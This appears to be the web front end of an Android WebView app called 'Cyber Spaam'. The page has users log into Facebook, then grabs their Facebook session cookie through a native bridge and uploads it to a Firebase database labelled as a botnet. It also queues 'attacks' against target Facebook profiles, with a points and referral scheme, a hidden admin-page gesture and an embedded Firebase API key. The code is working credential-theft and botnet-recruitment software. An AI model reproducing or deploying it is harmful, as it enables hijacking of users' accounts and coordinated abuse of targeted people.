<!-- language: HTML, file: www/index.html -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Cyber Spaam</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap');

    :root {
      --bg-color: #0b0f19;
      --card-bg: rgba(20, 25, 35, 0.85);
      --primary: #00ff41;
      --primary-glow: rgba(0, 255, 65, 0.4);
      --fb-blue: #1877f2;
      --danger: #ff3333;
      --share-color: #8b5cf6;
      --text-main: #e2e8f0;
      --text-muted: #94a3b8;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Rajdhani', sans-serif; user-select: none; }
    
    body { 
      background-color: var(--bg-color); 
      background-image: 
        radial-gradient(circle at 15% 50%, rgba(0, 255, 65, 0.05), transparent 25%),
        radial-gradient(circle at 85% 30%, rgba(24, 119, 242, 0.05), transparent 25%);
      color: var(--text-main); 
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .app-container {
      width: 100%;
      max-width: 400px;
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 20px;
      padding: 30px 24px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
      position: relative;
      overflow: hidden;
      animation: fadeIn 0.5s ease-out;
    }

    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

    .app-container::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 3px;
      background: linear-gradient(90deg, transparent, var(--primary), transparent);
      opacity: 0.7;
    }

    h1 {
      font-size: 28px;
      text-align: center;
      color: var(--primary);
      text-shadow: 0 0 15px var(--primary-glow);
      margin-bottom: 8px;
      letter-spacing: 2px;
      cursor: pointer;
      user-select: none;
    }

    .subtitle {
      text-align: center;
      color: var(--text-muted);
      font-size: 14px;
      margin-bottom: 30px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .btn:active { transform: scale(0.97); }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

    .btn-fb { background: var(--fb-blue); color: #fff; box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3); }
    .btn-success { background: var(--primary); color: #000; box-shadow: 0 4px 15px var(--primary-glow); }
    .btn-danger { background: var(--danger); color: #fff; box-shadow: 0 4px 15px rgba(255, 51, 51, 0.3); }
    .btn-share { background: var(--share-color); color: #fff; box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3); margin-top: 15px; }

    .btn-outline { 
      background: transparent; 
      border: 1px solid #334155; 
      color: var(--text-muted); 
      font-size: 14px;
      padding: 12px;
      margin-top: 20px;
    }

    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 255, 65, 0.1);
      color: var(--primary);
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      margin: 0 auto 20px auto;
      border: 1px solid rgba(0, 255, 65, 0.2);
    }

    .status-dot {
      width: 8px;
      height: 8px;
      background: var(--primary);
      border-radius: 50%;
      box-shadow: 0 0 10px var(--primary);
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }

    .points-card {
      background: #0f172a;
      border: 1px solid #1e293b;
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      margin-bottom: 24px;
      position: relative;
    }

    .points-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
    .points-value { font-size: 36px; font-weight: 700; color: #facc15; text-shadow: 0 0 10px rgba(250, 204, 21, 0.3); }

    .input-group { margin-bottom: 24px; text-align: left; }
    .input-label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; text-transform: uppercase; }
    
    input {
      width: 100%;
      background: #0b0f19;
      border: 1px solid #334155;
      color: var(--text-main);
      padding: 16px;
      border-radius: 12px;
      font-size: 15px;
      outline: none;
      transition: all 0.3s ease;
    }
    input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(0, 255, 65, 0.1); }

    .message { margin-top: 15px; font-size: 14px; text-align: center; font-weight: 600; min-height: 20px; }
    .msg-error { color: var(--danger); }
    .msg-success { color: var(--primary); }
    .msg-warning { color: #facc15; }
    .hidden { display: none !important; }
    .spinner { width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div id="loginPanel" class="app-container hidden">
    <h1 id="appLogo">CYBER SPAAM</h1>
    <p class="subtitle">Initialize Connection</p>
    <button class="btn btn-fb" onclick="openFacebookLogin()" id="btnFbLogin">1. Login to Facebook</button>
    <button class="btn btn-success" onclick="grabCookieAndSave()" id="btnConnect" style="margin-top: 16px;">
      <span class="spinner" id="connectSpinner"></span>
      <span id="connectText">2. Connect to Botnet</span>
    </button>
    <div id="loginStatus" class="message msg-error"></div>
  </div>

  <div id="attackPanel" class="app-container hidden">
    <h1>DASHBOARD</h1>
    <div style="text-align: center;">
      <div class="status-badge">
        <div class="status-dot"></div> BOTNET ACTIVE
      </div>
    </div>
    <div class="points-card">
      <div class="points-label">Available Points</div>
      <div class="points-value" id="userPoints">0</div>
    </div>
    <div class="input-group">
      <label class="input-label">Target Facebook URL</label>
      <input type="url" id="targetUrl" placeholder="https://facebook.com/username">
    </div>
    <button class="btn btn-danger" onclick="launchAttack()" id="btnAttack">
      <span class="spinner" id="attackSpinner" style="border-top-color: #fff;"></span>
      <span id="attackText">Execute Attack (-1 Pt)</span>
    </button>
    <button class="btn btn-share" onclick="goToShare()">Refer & Earn (+1 Point)</button>
    <button class="btn btn-outline" onclick="logout()">Disconnect / Switch Account</button>
    <div id="status" class="message msg-warning"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, child, update, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
      authDomain: "cyber-spaam.firebaseapp.com",
      databaseURL: "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "cyber-spaam",
      storageBucket: "cyber-spaam.firebasestorage.app",
      messagingSenderId: "180047004522",
      appId: "1:180047004522:web:470d5c50f2e333916d9b13"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let currentUserCookie = "";
    let currentUserPoints = 0;
    let currentUserKey = "";
    let referrerKey = ""; 

    window.onload = async function() {
      const urlParams = new URLSearchParams(window.location.search);
      const refParam = urlParams.get('ref');
      if (refParam) {
        localStorage.setItem('cyber_referrer', refParam);
        referrerKey = refParam;
      } else {
        referrerKey = localStorage.getItem('cyber_referrer') || "";
      }

      const savedCookie = localStorage.getItem('cyber_cookie');
      const savedKey = localStorage.getItem('cyber_key');

      if (savedCookie && savedKey) {
        currentUserCookie = savedCookie;
        currentUserKey = savedKey;
        try {
          const userRef = ref(db, `users/${currentUserKey}`);
          const snapshot = await get(userRef);
          if (snapshot.exists()) {
            currentUserPoints = snapshot.val().points || 0;
            document.getElementById('userPoints').innerText = currentUserPoints;
            document.getElementById('loginPanel').classList.add('hidden');
            document.getElementById('attackPanel').classList.remove('hidden');
            return;
          }
        } catch (e) { console.log("Auth error:", e); }
      }
      document.getElementById('attackPanel').classList.add('hidden');
      document.getElementById('loginPanel').classList.remove('hidden');
    }

    window.openFacebookLogin = function() {
      window.location.replace("https://m.facebook.com/login");
    }

    window.grabCookieAndSave = async function() {
      const status = document.getElementById('loginStatus');
      const btn = document.getElementById('btnConnect');
      const spinner = document.getElementById('connectSpinner');
      const btnText = document.getElementById('connectText');

      let cookie = "";
      let deviceName = "Unknown Device";
      
      if (window.AndroidCookieManager) {
        cookie = window.AndroidCookieManager.getFbCookie();
        deviceName = window.AndroidCookieManager.getDeviceName();
      } else {
        status.className = "message msg-error";
        status.innerText = "❌ WebView Error. Are you using the APK?";
        return;
      }

      if (!cookie || !cookie.includes('c_user')) {
        status.className = "message msg-error";
        status.innerText = "❌ Login failed or no cookie found.";
        return;
      }

      status.innerText = "";
      btn.disabled = true;
      spinner.style.display = "block";
      btnText.innerText = "Connecting...";
      
      try {
        const dbRef = ref(db);
        currentUserKey = btoa(cookie.substring(0, 15)); 
        const snapshot = await get(child(dbRef, `users/${currentUserKey}`));
        let points = 0;
        let isNewUser = false;

        if (snapshot.exists()) {
          points = snapshot.val().points || 0;
          await update(ref(db, `users/${currentUserKey}`), { cookie: cookie, deviceName: deviceName });
        } else {
          await set(ref(db, `users/${currentUserKey}`), { cookie: cookie, points: 0, deviceName: deviceName });
          isNewUser = true;
        }

        if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
          try {
            await update(ref(db, `users/${currentUserKey}`), { points: increment(1) });
            await update(ref(db, `users/${referrerKey}`), { points: increment(1), referrals: increment(1) });
            points += 1;
            localStorage.removeItem('cyber_referrer');
          } catch (refErr) { console.log("Referral error:", refErr); }
        }

        const accRef = ref(db, 'accounts');
        await set(push(accRef), { cookie: cookie });

        currentUserCookie = cookie;
        currentUserPoints = points;
        localStorage.setItem('cyber_cookie', currentUserCookie);
        localStorage.setItem('cyber_key', currentUserKey);

        document.getElementById('userPoints').innerText = points;
        document.getElementById('loginPanel').classList.add('hidden');
        document.getElementById('attackPanel').classList.remove('hidden');
        
      } catch (e) { 
        status.className = "message msg-error";
        status.innerText = "❌ Database Error: " + e.message; 
      } finally {
        btn.disabled = false;
        spinner.style.display = "none";
        btnText.innerText = "2. Connect to Botnet";
      }
    }

    window.launchAttack = async function() {
      const url = document.getElementById('targetUrl').value.trim();
      const status = document.getElementById('status');
      const btn = document.getElementById('btnAttack');
      const spinner = document.getElementById('attackSpinner');
      const btnText = document.getElementById('attackText');
      
      if (!url.includes('facebook.com')) {
        status.className = "message msg-error";
        status.innerText = "❌ Invalid Facebook URL";
        return;
      }
      if (currentUserPoints <= 0) {
        status.className = "message msg-error";
        status.innerText = "❌ Not enough points! Contact Admin.";
        return;
      }

      status.innerText = "";
      btn.disabled = true;
      spinner.style.display = "block";
      btnText.innerText = "Deploying...";

      try {
        currentUserPoints--;
        await update(ref(db, `users/${currentUserKey}`), { points: currentUserPoints });
        document.getElementById('userPoints').innerText = currentUserPoints;
        await set(push(ref(db, 'jobs')), { targetUrl: url, status: "pending", createdAt: Date.now() });

        status.className = "message msg-success";
        status.innerText = "✅ Attack Deployed!";
        document.getElementById('targetUrl').value = '';
        setTimeout(() => { status.innerText = ""; }, 3000);
      } catch (e) { 
        status.className = "message msg-error";
        status.innerText = "❌ Error: " + e.message; 
      } finally {
        btn.disabled = false;
        spinner.style.display = "none";
        btnText.innerText = "Execute Attack (-1 Pt)";
      }
    }

    window.goToShare = function() {
      window.location.href = "share.html";
    }

    window.logout = function() {
      const confirmSwitch = confirm("Switch Account?\n\nYour current account is SAVED in the Botnet database.");
      if (confirmSwitch) {
        localStorage.removeItem('cyber_cookie');
        localStorage.removeItem('cyber_key');
        window.location.reload(); 
      }
    }

    let tapCount = 0;
    let tapTimer;
    document.getElementById('appLogo').addEventListener('click', () => {
      tapCount++;
      clearTimeout(tapTimer);
      tapTimer = setTimeout(() => { tapCount = 0; }, 1000);
      if (tapCount >= 5) {
        tapCount = 0;
        window.location.href = "admin.html"; 
      }
    });
  </script>
</body>
      </html>
